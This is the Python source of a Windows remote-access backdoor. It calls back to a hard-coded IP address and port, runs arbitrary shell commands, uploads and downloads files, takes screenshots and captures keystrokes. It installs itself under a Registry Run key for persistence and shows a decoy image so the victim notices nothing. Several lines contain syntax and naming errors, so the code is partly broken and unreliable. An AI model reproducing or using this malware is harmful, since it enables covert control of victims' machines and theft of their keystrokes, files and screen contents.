#!/usr/bin/python2.7

import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import request
import ctypes
import threading
import keylogger
from mss import mss

def reliable_send(data):
        json_data=json.dumps(data)
        sock.send(json_data)


def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.43.209", 12345,))
			shell()
		except:
			connection()
def reliable_recv():
	json_data=""
	while True:
		try:
			json_data = json_data + sock.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue

def download(url):
	get_response= requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def his_admin():
	global admin
	try:
		temp= os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
	except:
		admin="User Privileges"
	else:
		admin="Administartion Privileges"
def shell():
	while True:
		command=reliable_recv()

		if command=="q":
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif command[:2] =="cd" and len(command) >1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], 'rb') as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], 'wb') as fin:
				result = reliable_recv()
				fin.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] download sucessfull")
			except:
				reliable_send("[!!] failed download file") 
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:],shell=True)
				reliable_send("started")
			except:
				reliable_send('failed to start')
		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open('monitor-1.png', 'rb') as filesc:
					reliable_send(base64.b64encode(file.read()))
				os.remove('monitor-1.png')
			except:
				reliable_send("[!!] Coudn't screenshot")
		elif command[:5] == "check":
			try:
				his_admin()
				reliable_send(admin)
			except:
				reliable_send("Can't perform check")
		elif: command[:12] == "keylog_start":
			try
				t1 =  threading.Thread(target=keylogger.start)
				t1.start()
			except:
				reliable_send("can't start keylogger")
		elif: command[:11] == "kelog_dump":
			fn=open(keylogger_path,"r")
			reliable_send(fn.read())
		else:
			try:
				proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result= proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send('cant send ')

keylogger_path=os.environ["appdata"] + "\\keylogger.txt"
location=os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Micrsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell=True )
	name=sys._MEIPASS +"\pexels-photo-13378649.jpeg"
	try:
		subprocess.Popen(name, shell=True)
	except:
		num =1
		num2=2
		add= num + num2

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()
